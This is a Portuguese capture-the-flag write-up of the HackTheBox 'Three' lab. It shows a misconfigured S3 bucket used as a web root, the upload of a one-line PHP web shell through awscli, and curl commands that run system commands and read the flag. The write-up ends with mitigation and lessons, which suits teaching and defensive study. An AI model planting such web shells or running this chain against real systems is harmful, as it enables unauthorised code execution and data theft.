# HackTheBox — Three (Tier 1)

## Informações

| Campo | Detalhe |
|---|---|
| **Plataforma** | HackTheBox Starting Point |
| **Tier** | 1 |
| **Dificuldade** | Very Easy |
| **Serviços** | HTTP, SSH, AWS S3 |
| **IP alvo** | 10.129.102.57 |

---

## Contexto

Máquina Linux com um site Apache e um bucket S3 mal configurado exposto como subdomínio. A misconfiguration permitia upload de arquivos arbitrários para o bucket — que era o diretório raiz do site. Upload de PHP web shell resultou em RCE.

---

## Reconhecimento

```bash
nmap -sV -sC 10.129.102.57
```

Resultado:

```
22/tcp  open  ssh     OpenSSH
80/tcp  open  http    Apache httpd
```

Porta 80 confirmou um site rodando. Ao acessar pelo IP diretamente, o site carregava parcialmente — sinal de que a aplicação usava hostname para roteamento, não apenas IP.

---

## Enumeração — Virtual Host e /etc/hosts

O site referenciava o domínio `thetoppers.htb`. Como não existe DNS real para esse domínio no lab, adicionei o mapeamento manualmente:

```bash
sudo nano /etc/hosts
```

```
10.129.102.57    thetoppers.htb
```

Isso faz o Kali resolver `thetoppers.htb` diretamente para o IP da máquina, sem precisar de DNS externo.

---

## Enumeração — Subdomínio S3

Enumerando subdomínios, apareceu `s3.thetoppers.htb`. O nome já indicava o serviço: Amazon S3 (ou um serviço compatível como LocalStack).

Adicionei o subdomínio ao `/etc/hosts`:

```
10.129.102.57    thetoppers.htb s3.thetoppers.htb
```

Confirmei que o subdomínio respondia:

```bash
curl http://s3.thetoppers.htb
```

Resposta:

```json
{"status":"running"}
```

Serviço S3 confirmado e acessível sem autenticação.

---

## Exploração — AWS CLI no bucket mal configurado

Instalei o `awscli` e configurei credenciais fictícias — o serviço não exigia autenticação real:

```bash
aws configure
# AWS Access Key ID: temp
# AWS Secret Access Key: temp
# Region: us-east-1
```

Listei os buckets disponíveis apontando para o endpoint local:

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls
```

Retornou:

```
thetoppers.htb
```

Listei o conteúdo do bucket:

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

Resultado:

```
images/
.htaccess
index.php
```

Os arquivos do bucket eram exatamente os arquivos do site — o bucket S3 estava montado como document root do Apache. Qualquer arquivo enviado ao bucket seria servido pelo servidor web.

---

## Exploração — Upload de Web Shell

Criei um arquivo PHP simples que executava comandos via parâmetro GET:

```php
<?php system($_GET['cmd']); ?>
```

Fiz o upload para o bucket:

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php
```

Testei a execução:

```bash
curl "http://thetoppers.htb/shell.php?cmd=whoami"
```

Resposta:

```
www-data
```

RCE confirmado. O servidor executou o PHP enviado via S3.

---

## Captura da Flag

Listei o diretório `/var/www`:

```bash
curl "http://thetoppers.htb/shell.php?cmd=ls%20/var/www"
```

Resultado:

```
flag.txt
html
```

Leitura direta:

```bash
curl "http://thetoppers.htb/shell.php?cmd=cat%20/var/www/flag.txt"
```

Flag capturada.

---

## Cadeia de exploração

```
nmap → HTTP na porta 80
→ site usava hostname → /etc/hosts com thetoppers.htb
→ enumeração de subdomínio → s3.thetoppers.htb
→ curl confirmou serviço S3 rodando
→ awscli listou bucket thetoppers.htb
→ bucket = document root do Apache
→ upload de shell.php via aws s3 cp
→ curl executou o PHP → whoami = www-data
→ cat /var/www/flag.txt → flag
```

---

## Impacto

Um bucket S3 com permissão de escrita pública, quando montado como diretório de um servidor web, é equivalente a um upload irrestrito de arquivos. Qualquer arquivo PHP enviado é executado pelo servidor — RCE direto sem nenhuma autenticação. Em ambientes AWS reais, esse padrão é mais comum do que parece: buckets mal configurados servindo sites estáticos que eventualmente executam código server-side.

---

## Mitigação

Nunca montar um bucket S3 público com permissão de escrita como document root de um servidor web. Configurar políticas de bucket com permissão apenas de leitura para acesso público. Em ambientes de produção, usar IAM roles com privilégio mínimo para qualquer acesso ao S3. Desabilitar a execução de PHP no diretório de uploads como camada adicional de defesa.

---

## Aprendizados

- Virtual hosts exigem entrada no `/etc/hosts` quando não há DNS real — padrão comum em labs e em redes internas corporativas.
- O nome de um subdomínio já é reconhecimento: `s3.` indica Amazon S3 ou serviço compatível imediatamente.
- AWS CLI funciona contra endpoints locais/customizados via `--endpoint-url` — útil tanto para labs quanto para testar misconfigurations em ambientes reais.
- Bucket S3 com escrita pública + servidor web que executa PHP = RCE sem nenhuma exploração sofisticada.
- Esse lab conecta três conceitos independentes (virtual hosts, S3, file upload RCE) em uma cadeia linear — o padrão de pentest real.
